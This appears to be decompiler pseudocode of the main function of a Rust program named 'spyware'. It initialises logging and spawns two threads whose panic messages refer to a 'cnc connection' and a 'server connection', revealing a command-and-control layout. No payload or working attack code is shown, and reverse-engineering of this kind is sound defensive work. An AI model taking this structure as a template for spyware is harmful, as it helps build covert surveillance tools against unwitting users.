fn spyware::main() -> void {
    let v0: struct48;  // [bp-0xd8], Other Possible Types: struct32, u64
    let v1: u64;  // [bp-0xd0]
    let v2: u64;  // [bp-0xc8]
    let v3: u128;  // [bp-0xc0]
    let v4: void*;  // [bp-0xa0]
    let v5: u64;  // [bp-0x90]
    let v6: u64;  // [bp-0x88]
    let v7: u64;  // [bp-0x80]
    let v8: u8;  // [bp-0x78]
    let v9: u32;  // [bp-0x77]
    let v10: u16;  // [bp-0x73]
    let v11: struct52;  // [bp-0x71]
    let v12: struct40;  // [bp-0x70]
    let v13: struct32;  // [bp-0x70]
    let v14: struct32;  // [bp-0x48]
    let v15: struct32;  // [bp-0x48]
    let v16: struct32;  // [bp-0x28]
    let v17: struct32;  // [bp-0x28]
    let v20: u64;  // rdx

    spyware::init_logging();
    if core::sync::atomic::atomic_load() >= 3 {
        v0 = "Logging successfully initialized";
        v1 = 1;
        v2 = 8;
        v3 = 0;
        v12 = struct40 {
            field_0: "spyware"
            field_16: "spyware"
            field_32: log::__private_api::loc("src/main.rs")
        };
        log::__private_api::log(&v0, 3, &v12);
    }
    v5 = 0x8000000000000000;
    v4 = 0;
    v8 = 0;
    v0 = struct48 {
        field_0: *(&v4 as &i128)
        field_16: 0x8000000000000000
        field_24: v6
        field_32: v7
        field_40: 0
        field_41: v9
        field_45: v10
        field_47: v11
    };
    std::thread::Builder::spawn_unchecked(&v13, &v0);
    v14 = core::result::Result<T,E>::expect(&v13);
    v0 = std::thread::Builder::spawn_unchecked(&v4);
    v16 = core::result::Result<T,E>::expect(&v0);
    v0 = v17;
    core::result::Result<T,E>::expect(std::thread::JoinInner<T>::join(&v0), v20, "The cnc connection has panicked.", "src/main.rs");
    v0 = v15;
    core::result::Result<T,E>::expect(std::thread::JoinInner<T>::join(&v0), v20, "The server connection has panicked.", "src/main.rs");
    return;
}
